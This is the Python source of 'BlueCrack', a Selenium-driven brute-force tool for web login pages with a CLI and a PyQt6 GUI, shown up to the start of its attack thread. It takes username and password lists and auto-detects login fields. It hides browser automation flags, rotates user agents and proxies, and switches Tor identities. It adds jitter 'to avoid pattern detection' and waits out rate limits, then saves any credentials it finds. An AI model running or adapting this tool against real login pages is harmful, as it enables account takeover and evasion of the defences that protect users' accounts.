#!/usr/bin/env python3
"""
BlueCrack — Advanced Browser Penetration Framework
===================================================
Hydra-style brute-force tester powered by Selenium WebDriver.
Supports both a PyQt6 GUI and a full-featured CLI with interactive wizard.
"""

# ═══════════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════════
import argparse
import builtins
import json
import os
import random
import signal
import sys
import threading
import time
from datetime import datetime
from queue import Queue
from typing import Any, Dict, List, Optional, Set, Tuple

from selenium import webdriver
from selenium.common.exceptions import (
    NoSuchElementException,
    TimeoutException,
    WebDriverException,
)
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait

import keyboard

# Optional: PyQt6 GUI
try:
    from PyQt6.QtCore import QThread, pyqtSignal, Qt, QTimer
    from PyQt6.QtGui import QFont, QColor, QShortcut, QKeySequence, QIcon
    from PyQt6.QtWidgets import (
        QApplication,
        QWidget,
        QVBoxLayout,
        QHBoxLayout,
        QLabel,
        QLineEdit,
        QPushButton,
        QCheckBox,
        QSpinBox,
        QTextEdit,
        QFileDialog,
        QMessageBox,
        QTabWidget,
        QFormLayout,
        QGroupBox,
        QDoubleSpinBox,
        QFrame,
        QSplitter,
        QProgressBar,
        QComboBox,
        QScrollArea,
        QSizePolicy,
    )

    HAS_PYQT = True
except ImportError:
    HAS_PYQT = False

# Optional: Tor IP shifting via stem
try:
    from stem import Signal as TorSignal
    from stem.control import Controller as TorController

    HAS_STEM = True
except ImportError:
    HAS_STEM = False


# ═══════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════
CSS_PATH_JS: str = """
function cssPath(el){
    if(!el) return null;
    var p=[];
    while(el.nodeType===1){
        var s=el.nodeName.toLowerCase();
        if(el.id){
            s+='#'+el.id;
            p.unshift(s);
            break;
        } else {
            var sib=el, n=1;
            while(sib=sib.previousElementSibling){
                if(sib.nodeName.toLowerCase()==s) n++;
            }
            if(n!=1) s+=':nth-of-type('+n+')';
        }
        p.unshift(s);
        el=el.parentNode;
    }
    return p.join(' > ');
}
return cssPath(arguments[0]);
"""

AUTO_DETECT_JS: str = """
window._autoFindFields = function() {
    let passwordField = document.querySelector('input[type="password"]');
    let userField = null;
    if (passwordField) {
        let inputs = Array.from(
            passwordField.form
                ? passwordField.form.querySelectorAll('input')
                : document.querySelectorAll('input')
        );
        for (let el of inputs) {
            if ((el.type === 'text' || el.type === 'email' || el.name.includes('user')) && el !== passwordField) {
                userField = el;
                break;
            }
        }
    }
    let ucss = userField
        ? userField.tagName.toLowerCase() + (userField.id ? '#'+userField.id : (userField.name ? '[name="'+userField.name+'"]' : ''))
        : null;
    let pcss = passwordField
        ? passwordField.tagName.toLowerCase() + (passwordField.id ? '#'+passwordField.id : (passwordField.name ? '[name="'+passwordField.name+'"]' : ''))
        : null;
    return [ucss, pcss];
};
"""

CLICK_LISTENER_JS: str = """
document.addEventListener('click', function(e){ window._lastClicked = e.target; });
"""

DEFAULT_USER_AGENTS: List[str] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

DEFAULT_LIMIT_TEXT: str = "too many requests"

# ANSI color helpers
_GREEN = "\033[32m"
_RED = "\033[31m"
_YELLOW = "\033[33m"
_CYAN = "\033[36m"
_BLUE = "\033[34m"
_RESET = "\033[0m"
_BOLD = "\033[1m"

# ── Graceful stop flag (shared between CLI & GUI) ──
_GLOBAL_STOP: threading.Event = threading.Event()
_FOUND_EVENT: threading.Event = threading.Event()


# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════
def print_banner() -> None:
    """Print the BlueCrack ASCII art banner."""
    print(
        """
\033[34m██████╗ ██╗     ██╗   ██╗███████╗\033[0m \033[31m ██████╗██████╗  █████╗  ██████╗██╗  ██╗\033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔════╝\033[0m \033[31m██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\033[0m
\033[34m██████╔╝██║     ██║   ██║█████╗  \033[0m \033[31m██║     ██████╔╝███████║██║     █████╔╝ \033[0m
\033[34m██╔══██╗██║     ██║   ██║██╔══╝  \033[0m \033[31m██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \033[0m
\033[34m██████╔╝███████╗╚██████╔╝███████╗\033[0m \033[31m╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\033[0m
\033[34m╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝\033[0m \033[31m ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\033[0m
"""
    )


print_banner()


def _signal_handler(sig: int, frame: Any) -> None:
    """Handle Ctrl+C / Ctrl+X for graceful shutdown."""
    print(f"\n{_YELLOW}[!] Caught Ctrl+C / Ctrl+X — stopping gracefully...{_RESET}")
    _GLOBAL_STOP.set()
    _FOUND_EVENT.set()


signal.signal(signal.SIGINT, _signal_handler)


def change_tor_ip(control_port: int = 9051, password: Optional[str] = None) -> bool:
    """Request a new Tor identity (new IP).

    Args:
        control_port: Tor control port number.
        password: Optional authentication password for the Tor controller.

    Returns:
        True if identity was successfully changed, False otherwise.
    """
    if not HAS_STEM:
        return False
    try:
        with TorController.from_port(port=control_port) as ctrl:
            if password:
                ctrl.authenticate(password=password)
            else:
                ctrl.authenticate()
            ctrl.signal(TorSignal.NEWNYM)
            return True
    except Exception as e:
        print(f"{_RED}[-] Tor IP shift failed: {e}{_RESET}")
        return False


def build_chrome_options(ctx: Dict[str, Any]) -> webdriver.ChromeOptions:
    """Build ChromeOptions from the given context dictionary.

    Args:
        ctx: Configuration dictionary with keys like 'headless', 'use_tor', 'proxies', etc.

    Returns:
        Configured ChromeOptions instance.
    """
    options = webdriver.ChromeOptions()
    options.add_experimental_option("excludeSwitches", ["enable-automation"])
    options.add_experimental_option("useAutomationExtension", False)
    options.add_argument("--disable-blink-features=AutomationControlled")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument(f"user-agent={random.choice(DEFAULT_USER_AGENTS)}")

    if ctx.get("use_tor"):
        options.add_argument("--proxy-server=socks5://127.0.0.1:9050")
    elif ctx.get("proxies"):
        options.add_argument(f"--proxy-server={random.choice(ctx['proxies'])}")

    if ctx.get("headless"):
        options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--window-size=1920x1080")

    return options


def create_driver_safe(
    options: webdriver.ChromeOptions, max_retries: int = 3
) -> Optional[webdriver.Chrome]:
    """Create a Chrome WebDriver with retry logic.

    Args:
        options: Chrome options to use.
        max_retries: Maximum number of creation attempts.

    Returns:
        A Chrome WebDriver instance, or None if all retries failed.
    """
    for attempt in range(max_retries):
        try:
            wd = webdriver.Chrome(options=options)
            return wd
        except WebDriverException as e:
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return None
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)
            else:
                return None
    return None


def _save_json_report(
    report_path: str,
    target_url: str,
    metrics: Dict[str, int],
    found_creds: List[Tuple[str, str]],
    start_time: float,
    end_time: float,
) -> None:
    """Save a JSON report of the attack results.

    Args:
        report_path: Output file path for the JSON report.
        target_url: The target URL that was tested.
        metrics: Dictionary of attack metrics.
        found_creds: List of (username, password) tuples found.
        start_time: Unix timestamp when attack started.
        end_time: Unix timestamp when attack ended.
    """
    report = {
        "target_url": target_url,
        "start_time": datetime.fromtimestamp(start_time).isoformat(),
        "end_time": datetime.fromtimestamp(end_time).isoformat(),
        "duration_seconds": round(end_time - start_time, 2),
        "metrics": metrics,
        "credentials_found": [{"username": u, "password": p} for u, p in found_creds],
    }
    try:
        with open(report_path, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
# ARGPARSE SETUP
# ═══════════════════════════════════════════════════════════════════
parser = argparse.ArgumentParser(
    description="BlueCrack — Advanced Browser Penetration Framework"
)

# USERNAME INPUT
parser.add_argument("-u", "--user", dest="username", help="single username to test")
parser.add_argument(
    "-U", "--userfile", dest="userfile", help="file containing list of usernames"
)

# PASSWORD INPUT
parser.add_argument("-p", "--passw", dest="password", help="single password to test")
parser.add_argument(
    "-P", "--passlist", dest="passfile", help="file containing list of passwords"
)

# ENGINE
parser.add_argument("--threads", type=int, default=1, help="number of threads")
parser.add_argument("--url", help="login page URL")
parser.add_argument(
    "--error",
    default="",
    help="error message to check for failed login (default: none)",
)
parser.add_argument(
    "--success",
    default="",
    help="success message to verify successful login (if error is inadequate)",
)
parser.add_argument(
    "--headless", action="store_true", help="run worker browsers in headless mode"
)
parser.add_argument(
    "--delay",
    type=float,
    default=0.0,
    help="delay between natural attempts to stay stealthy",
)
parser.add_argument(
    "--limit-text",
    default=DEFAULT_LIMIT_TEXT,
    help="text confirming rate limit hit",
)
parser.add_argument(
    "--cooldown",
    type=int,
    default=12,
    help="cooldown bypass timer to wait out rate blocks",
)
parser.add_argument(
    "--jitter",
    type=float,
    default=0.0,
    help="randomize the delay by up to X seconds to avoid pattern detection",
)
parser.add_argument(
    "--proxy", help="single proxy to use (e.g., http://12.34.56.78:8080)"
)
parser.add_argument(
    "--proxy-list", dest="proxyfile", help="file containing list of proxies to rotate"
)
parser.add_argument(
    "-i",
    "--interactive",
    action="store_true",
    help="launch fully interactive/auto setup wizard",
)
parser.add_argument(
    "--gui", action="store_true", help="launch the PyQt6 GUI instead of CLI"
)

# ── New CLI arguments ──
parser.add_argument(
    "--max-attempts",
    type=int,
    default=0,
    help="maximum total attempts (0 = unlimited)",
)
parser.add_argument(
    "--continue-after-success",
    action="store_true",
    help="continue testing after finding credentials",
)
parser.add_argument(
    "--output",
    type=str,
    default="credentials.txt",
    help="output file path for found credentials (default: credentials.txt)",
)
parser.add_argument(
    "--json-report",
    action="store_true",
    help="save a JSON report when finished",
)

args = parser.parse_args()


# ═══════════════════════════════════════════════════════════════════
# ██  GUI MODE  ██
# ═══════════════════════════════════════════════════════════════════
if args.gui or (len(sys.argv) == 1 and HAS_PYQT):
    if not HAS_PYQT:
        raise SystemExit("PyQt6 not installed. Run: pip install PyQt6 stem")

    # ── Import CUPP helpers ──
    _cupp_dir: str = os.path.dirname(os.path.abspath(__file__))
    sys.path.insert(0, _cupp_dir)
    try:
        import cupp as _cupp_mod
    except ImportError:
        _cupp_mod = None

    # ─────────────────── Premium Glassmorphism Dark Theme ───────────────────
    DARK_STYLE: str = """
    /* ═══════════════════════════════════════════════════════════════════
       BLUECRACK DARK THEME stylesheet
       Premium corporate-grade styling with Indigo-Cyan accents.
       ═══════════════════════════════════════════════════════════════════ */

    /* --- Global & Base Widgets --- */
    QWidget {
        background-color: #030712;
        color: #f9fafb;
        font-family: 'Inter', 'Segoe UI', -apple-system, sans-serif;
        font-size: 13px;
    }

    QDialog, QMainWindow {
        background-color: #030712;
    }

    /* --- Group Boxes (Card Containers) --- */
    QGroupBox {
        background-color: #0b0f19;
        border: 1px solid #1f2937;
        border-radius: 8px;
        margin-top: 20px;
        padding: 24px 16px 16px 16px;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.75px;
        font-size: 11px;
        color: #818cf8;
    }

    QGroupBox::title {
        subcontrol-origin: margin;
        subcontrol-position: top left;
        left: 12px;
        top: 4px;
        padding: 2px 8px;
        background-color: #030712;
        border-radius: 4px;
        border: 1px solid #1f2937;
        color: #818cf8;
    }

    /* --- Scroll Areas --- */
    QScrollArea {
        border: none;
        background-color: transparent;
    }

    QScrollArea > QWidget > QWidget {
        background-color: transparent;
    }

    /* --- ScrollBars --- */
    QScrollBar:vertical {
        background-color: #030712;
        width: 8px;
        margin: 0px;
        border-radius: 4px;
    }

    QScrollBar::handle:vertical {
        background-color: #1f2937;
        min-height: 24px;
        border-radius: 4px;
        border: 1px solid #374151;
    }

    QScrollBar::handle:vertical:hover {
        background-color: #374151;
    }

    QScrollBar::handle:vertical:pressed {
        background-color: #4b5563;
    }

    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical,
    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
        background: none;
        height: 0px;
    }

    QScrollBar:horizontal {
        background-color: #030712;
        height: 8px;
        margin: 0px;
        border-radius: 4px;
    }

    QScrollBar::handle:horizontal {
        background-color: #1f2937;
        min-width: 24px;
        border-radius: 4px;
        border: 1px solid #374151;
    }

    QScrollBar::handle:horizontal:hover {
        background-color: #374151;
    }

    QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal,
    QScrollBar::add-page:horizontal, QScrollBar::sub-page:horizontal {
        background: none;
        width: 0px;
    }

    /* --- Tab Widget & Tab Bar --- */
    QTabWidget {
        background-color: transparent;
    }

    QTabWidget::pane {
        border: 1px solid #1f2937;
        border-radius: 8px;
        background-color: #0b0f19;
        top: -1px;
    }

    QTabBar {
        background-color: transparent;
        qproperty-drawBase: 0;
    }

    QTabBar::tab {
        background-color: #030712;
        color: #9ca3af;
        border: 1px solid #1f2937;
        border-bottom: none;
        border-top-left-radius: 6px;
        border-top-right-radius: 6px;
        padding: 8px 18px;
        margin-right: 4px;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 0.5px;
    }

    QTabBar::tab:hover {
        background-color: #0b0f19;
        color: #f9fafb;
    }

    QTabBar::tab:selected {
        background-color: #0b0f19;
        color: #06b6d4;
        border: 1px solid #1f2937;
        border-bottom: 2px solid #06b6d4;
        padding-bottom: 8px;
    }

    /* --- Form Fields & Inputs --- */
    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
        background-color: #0d1220;
        border: 1px solid #1f2937;
        border-radius: 6px;
        padding: 6px 12px;
        color: #f9fafb;
        selection-background-color: rgba(99, 102, 241, 0.4);
    }

    QLineEdit:hover, QSpinBox:hover, QDoubleSpinBox:hover, QComboBox:hover {
        border: 1px solid #374151;
    }

    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
        border: 1px solid #6366f1;
        background-color: #0f172a;
    }

    QLineEdit::placeholder {
        color: #4b5563;
    }

    QComboBox::drop-down {
        subcontrol-origin: padding;
        subcontrol-position: top right;
        width: 24px;
        border-left-width: 0px;
    }

    QComboBox::down-arrow {
        image: none;
        border-left: 4px solid transparent;
        border-right: 4px solid transparent;
        border-top: 5px solid #9ca3af;
        margin-top: 2px;
    }

    QComboBox QAbstractItemView {
        background-color: #0b0f19;
        border: 1px solid #1f2937;
        border-radius: 6px;
        selection-background-color: #6366f1;
        selection-color: #f9fafb;
        color: #9ca3af;
    }

    /* --- Buttons --- */
    QPushButton {
        background-color: #1f2937;
        border: 1px solid #374151;
        border-radius: 6px;
        padding: 8px 16px;
        color: #f9fafb;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 0.5px;
    }

    QPushButton:hover {
        background-color: #374151;
        border-color: #4b5563;
    }

    QPushButton:pressed {
        background-color: #111827;
        border-color: #6366f1;
    }

    QPushButton:disabled {
        background-color: #030712;
        color: #4b5563;
        border-color: #1f2937;
    }

    /* --- Checkboxes --- */
    QCheckBox {
        spacing: 8px;
        color: #e5e7eb;
    }

    QCheckBox::indicator {
        width: 16px;
        height: 16px;
        border-radius: 4px;
        border: 1px solid #1f2937;
        background-color: #0b0f19;
    }

    QCheckBox::indicator:hover {
        border-color: #374151;
    }

    QCheckBox::indicator:checked {
        background-color: #6366f1;
        border-color: #6366f1;
        image: none;
    }

    /* --- Terminal Console (TextEdit) --- */
    QTextEdit {
        background-color: #020617;
        border: 1px solid #1f2937;
        border-radius: 8px;
        color: #22d3ee;
        font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
        font-size: 12px;
        line-height: 1.4;
        padding: 12px;
    }

    /* --- Progress Bar --- */
    QProgressBar {
        background-color: #111827;
        border: 1px solid #1f2937;
        border-radius: 8px;
        text-align: center;
        color: #f9fafb;
        height: 20px;
        font-weight: bold;
        font-size: 11px;
    }

    QProgressBar::chunk {
        border-radius: 7px;
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
            stop:0 #6366f1, stop:1 #06b6d4);
    }

    /* --- Custom Styled Widgets by Object Name --- */

    QPushButton#startBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #10b981, stop:1 #059669);
        color: #ffffff;
        border: none;
        font-weight: 700;
        font-size: 12px;
    }

    QPushButton#startBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #059669, stop:1 #047857);
    }

    QPushButton#startBtn:disabled {
        background: #064e3b;
        color: #34d399;
        opacity: 0.5;
    }

    QPushButton#stopBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #ef4444, stop:1 #dc2626);
        color: #ffffff;
        border: none;
        font-weight: 700;
        font-size: 12px;
    }

    QPushButton#stopBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #dc2626, stop:1 #b91c1c);
    }

    QPushButton#stopBtn:disabled {
        background: #7f1d1d;
        color: #f87171;
        opacity: 0.5;
    }

    QPushButton#cuppGenBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #6366f1, stop:1 #4f46e5);
        color: #ffffff;
        border: none;
    }

    QPushButton#cuppGenBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4f46e5, stop:1 #4338ca);
    }

    QPushButton#seqGenBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #06b6d4, stop:1 #0891b2);
        color: #ffffff;
        border: none;
    }

    QPushButton#seqGenBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #0891b2, stop:1 #0e7490);
    }

    QPushButton#themeBtn {
        border-radius: 16px;
        background-color: #0b0f19;
        border: 1px solid #1f2937;
        font-size: 14px;
        font-weight: bold;
        padding: 0px;
    }

    QPushButton#themeBtn:hover {
        background-color: #1f2937;
        border-color: #6366f1;
    }

    QFrame#footerFrame {
        background-color: #0b0f19;
        border: 1px solid #1f2937;
        border-radius: 8px;
    }

    QFrame#statBox {
        background-color: rgba(15, 23, 42, 0.6);
        border: 1px solid rgba(148, 163, 184, 0.1);
        border-radius: 8px;
    }

    QLabel#titleLabel {
        font-size: 28px;
        font-weight: 800;
        color: #ffffff;
        letter-spacing: 1px;
    }

    QLabel#subtitleLabel {
        font-size: 12px;
        color: #9ca3af;
    }

    QLabel#statLabel {
        font-size: 11px;
        color: #9ca3af;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    QLabel#statValue {
        font-size: 12px;
        color: #22d3ee;
        font-weight: 700;
        font-family: 'JetBrains Mono', monospace;
    }

    QLabel#statusLabel {
        color: #9ca3af;
        font-size: 11px;
        padding: 4px;
    }

    QFormLayout QLabel {
        color: #9ca3af;
        font-weight: 500;
    }

    QSplitter::handle {
        background-color: #1f2937;
    }

    QSplitter::handle:hover {
        background-color: #6366f1;
    }

    QToolTip {
        background-color: #030712;
        color: #f9fafb;
        border: 1px solid #6366f1;
        border-radius: 6px;
        padding: 6px 10px;
    }
    """

    LIGHT_STYLE: str = """
    /* ═══════════════════════════════════════════════════════════════════
       BLUECRACK LIGHT THEME stylesheet
       Premium corporate-grade styling with Indigo-Cyan accents.
       ═══════════════════════════════════════════════════════════════════ */

    /* --- Global & Base Widgets --- */
    QWidget {
        background-color: #f9fafb;
        color: #111827;
        font-family: 'Inter', 'Segoe UI', -apple-system, sans-serif;
        font-size: 13px;
    }

    QDialog, QMainWindow {
        background-color: #f9fafb;
    }

    /* --- Group Boxes (Card Containers) --- */
    QGroupBox {
        background-color: #ffffff;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        margin-top: 20px;
        padding: 24px 16px 16px 16px;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.75px;
        font-size: 11px;
        color: #4f46e5;
    }

    QGroupBox::title {
        subcontrol-origin: margin;
        subcontrol-position: top left;
        left: 12px;
        top: 4px;
        padding: 2px 8px;
        background-color: #f9fafb;
        border-radius: 4px;
        border: 1px solid #e5e7eb;
        color: #4f46e5;
    }

    /* --- Scroll Areas --- */
    QScrollArea {
        border: none;
        background-color: transparent;
    }

    QScrollArea > QWidget > QWidget {
        background-color: transparent;
    }

    /* --- ScrollBars --- */
    QScrollBar:vertical {
        background-color: #f9fafb;
        width: 8px;
        margin: 0px;
        border-radius: 4px;
    }

    QScrollBar::handle:vertical {
        background-color: #e5e7eb;
        min-height: 24px;
        border-radius: 4px;
        border: 1px solid #d1d5db;
    }

    QScrollBar::handle:vertical:hover {
        background-color: #d1d5db;
    }

    QScrollBar::handle:vertical:pressed {
        background-color: #9ca3af;
    }

    QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical,
    QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
        background: none;
        height: 0px;
    }

    QScrollBar:horizontal {
        background-color: #f9fafb;
        height: 8px;
        margin: 0px;
        border-radius: 4px;
    }

    QScrollBar::handle:horizontal {
        background-color: #e5e7eb;
        min-width: 24px;
        border-radius: 4px;
        border: 1px solid #d1d5db;
    }

    QScrollBar::handle:horizontal:hover {
        background-color: #d1d5db;
    }

    QScrollBar::add-line:horizontal, QScrollBar::sub-line:horizontal,
    QScrollBar::add-page:horizontal, QScrollBar::sub-page:horizontal {
        background: none;
        width: 0px;
    }

    /* --- Tab Widget & Tab Bar --- */
    QTabWidget {
        background-color: transparent;
    }

    QTabWidget::pane {
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        background-color: #ffffff;
        top: -1px;
    }

    QTabBar {
        background-color: transparent;
        qproperty-drawBase: 0;
    }

    QTabBar::tab {
        background-color: #f9fafb;
        color: #6b7280;
        border: 1px solid #e5e7eb;
        border-bottom: none;
        border-top-left-radius: 6px;
        border-top-right-radius: 6px;
        padding: 8px 18px;
        margin-right: 4px;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 0.5px;
    }

    QTabBar::tab:hover {
        background-color: #ffffff;
        color: #111827;
    }

    QTabBar::tab:selected {
        background-color: #ffffff;
        color: #0891b2;
        border: 1px solid #e5e7eb;
        border-bottom: 2px solid #0891b2;
        padding-bottom: 8px;
    }

    /* --- Form Fields & Inputs --- */
    QLineEdit, QSpinBox, QDoubleSpinBox, QComboBox {
        background-color: #ffffff;
        border: 1px solid #d1d5db;
        border-radius: 6px;
        padding: 6px 12px;
        color: #111827;
        selection-background-color: rgba(99, 102, 241, 0.2);
    }

    QLineEdit:hover, QSpinBox:hover, QDoubleSpinBox:hover, QComboBox:hover {
        border: 1px solid #9ca3af;
    }

    QLineEdit:focus, QSpinBox:focus, QDoubleSpinBox:focus, QComboBox:focus {
        border: 1px solid #4f46e5;
        background-color: #ffffff;
    }

    QLineEdit::placeholder {
        color: #9ca3af;
    }

    QComboBox::drop-down {
        subcontrol-origin: padding;
        subcontrol-position: top right;
        width: 24px;
        border-left-width: 0px;
    }

    QComboBox::down-arrow {
        image: none;
        border-left: 4px solid transparent;
        border-right: 4px solid transparent;
        border-top: 5px solid #4b5563;
        margin-top: 2px;
    }

    QComboBox QAbstractItemView {
        background-color: #ffffff;
        border: 1px solid #d1d5db;
        border-radius: 6px;
        selection-background-color: #4f46e5;
        selection-color: #ffffff;
        color: #4b5563;
    }

    /* --- Buttons --- */
    QPushButton {
        background-color: #f3f4f6;
        border: 1px solid #e5e7eb;
        border-radius: 6px;
        padding: 8px 16px;
        color: #111827;
        font-weight: 600;
        text-transform: uppercase;
        font-size: 11px;
        letter-spacing: 0.5px;
    }

    QPushButton:hover {
        background-color: #e5e7eb;
        border-color: #d1d5db;
    }

    QPushButton:pressed {
        background-color: #f3f4f6;
        border-color: #4f46e5;
    }

    QPushButton:disabled {
        background-color: #f9fafb;
        color: #9ca3af;
        border-color: #e5e7eb;
    }

    /* --- Checkboxes --- */
    QCheckBox {
        spacing: 8px;
        color: #374151;
    }

    QCheckBox::indicator {
        width: 16px;
        height: 16px;
        border-radius: 4px;
        border: 1px solid #d1d5db;
        background-color: #ffffff;
    }

    QCheckBox::indicator:hover {
        border-color: #9ca3af;
    }

    QCheckBox::indicator:checked {
        background-color: #4f46e5;
        border-color: #4f46e5;
        image: none;
    }

    /* --- Terminal Console (TextEdit) --- */
    QTextEdit {
        background-color: #0f172a;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
        color: #22d3ee;
        font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', monospace;
        font-size: 12px;
        line-height: 1.4;
        padding: 12px;
    }

    /* --- Progress Bar --- */
    QProgressBar {
        background-color: #e5e7eb;
        border: 1px solid #d1d5db;
        border-radius: 8px;
        text-align: center;
        color: #111827;
        height: 20px;
        font-weight: bold;
        font-size: 11px;
    }

    QProgressBar::chunk {
        border-radius: 7px;
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
            stop:0 #4f46e5, stop:1 #0891b2);
    }

    /* --- Custom Styled Widgets by Object Name --- */

    QPushButton#startBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #10b981, stop:1 #059669);
        color: #ffffff;
        border: none;
        font-weight: 700;
        font-size: 12px;
    }

    QPushButton#startBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #059669, stop:1 #047857);
    }

    QPushButton#startBtn:disabled {
        background: #d1fae5;
        color: #a7f3d0;
    }

    QPushButton#stopBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #ef4444, stop:1 #dc2626);
        color: #ffffff;
        border: none;
        font-weight: 700;
        font-size: 12px;
    }

    QPushButton#stopBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #dc2626, stop:1 #b91c1c);
    }

    QPushButton#stopBtn:disabled {
        background: #fee2e2;
        color: #fca5a5;
    }

    QPushButton#cuppGenBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4f46e5, stop:1 #4338ca);
        color: #ffffff;
        border: none;
    }

    QPushButton#cuppGenBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #4338ca, stop:1 #3730a3);
    }

    QPushButton#seqGenBtn {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #0891b2, stop:1 #0e7490);
        color: #ffffff;
        border: none;
    }

    QPushButton#seqGenBtn:hover {
        background: qlineargradient(x1:0, y1:0, x2:1, y2:0, stop:0 #0e7490, stop:1 #155e75);
    }

    QPushButton#themeBtn {
        border-radius: 16px;
        background-color: #ffffff;
        border: 1px solid #d1d5db;
        font-size: 14px;
        font-weight: bold;
        padding: 0px;
    }

    QPushButton#themeBtn:hover {
        background-color: #f3f4f6;
        border-color: #4f46e5;
    }

    QFrame#footerFrame {
        background-color: #ffffff;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
    }

    QFrame#statBox {
        background-color: #ffffff;
        border: 1px solid #e5e7eb;
        border-radius: 8px;
    }

    QLabel#titleLabel {
        font-size: 28px;
        font-weight: 800;
        color: #111827;
        letter-spacing: 1px;
    }

    QLabel#subtitleLabel {
        font-size: 12px;
        color: #4b5563;
    }

    QLabel#statLabel {
        font-size: 11px;
        color: #4b5563;
        font-weight: 600;
        text-transform: uppercase;
        letter-spacing: 0.5px;
    }

    QLabel#statValue {
        font-size: 12px;
        color: #0891b2;
        font-weight: 700;
        font-family: 'JetBrains Mono', monospace;
    }

    QLabel#statusLabel {
        color: #4b5563;
        font-size: 11px;
        padding: 4px;
    }

    QFormLayout QLabel {
        color: #4b5563;
        font-weight: 500;
    }

    QSplitter::handle {
        background-color: #e5e7eb;
    }

    QSplitter::handle:hover {
        background-color: #4f46e5;
    }

    QToolTip {
        background-color: #ffffff;
        color: #111827;
        border: 1px solid #4f46e5;
        border-radius: 6px;
        padding: 6px 10px;
    }
    """

    # ─────────────────── GUI Worker Thread ───────────────────
    class GuiWorkerThread(QThread):
        """Worker thread that runs the brute-force attack via Selenium WebDriver.

        Emits log, progress, metrics, and finished signals to the GUI.
        """

        log_signal = pyqtSignal(str)
        progress_signal = pyqtSignal(int, int)  # current, total
        finished_signal = pyqtSignal(bool, str)  # found, message
        metrics_signal = pyqtSignal(dict)  # live metrics for footer

        def __init__(self, ctx: Dict[str, Any]) -> None:
            super().__init__()
            self.ctx: Dict[str, Any] = ctx
            self._stop_flag: threading.Event = threading.Event()
            self._start_time: float = 0.0

        def request_stop(self) -> None:
            """Signal the worker to stop gracefully."""
            self._stop_flag.set()
            _GLOBAL_STOP.set()

        def log(self, msg: str) -> None:
            """Emit a log message to the GUI."""
            self.log_signal.emit(msg)

        def run(self) -> None:
            """Main worker execution: detect selectors then launch attack threads."""
            _GLOBAL_STOP.clear()
            ctx = self.ctx
            users: List[str] = ctx["users"]
            passwords: List[str] = ctx["passwords"]
            total: int = len(users) * len(passwords)
            done: List[int] = [0]
            found_users: Set[str] = set()
            found_creds: List[Tuple[str, str]] = []
            _found_lock = threading.Lock()
            multiple_users: bool = len(users) > 1
            success_msg: str = ctx.get("success_msg", "").lower().strip()
            max_attempts: int = ctx.get("max_attempts", 0)
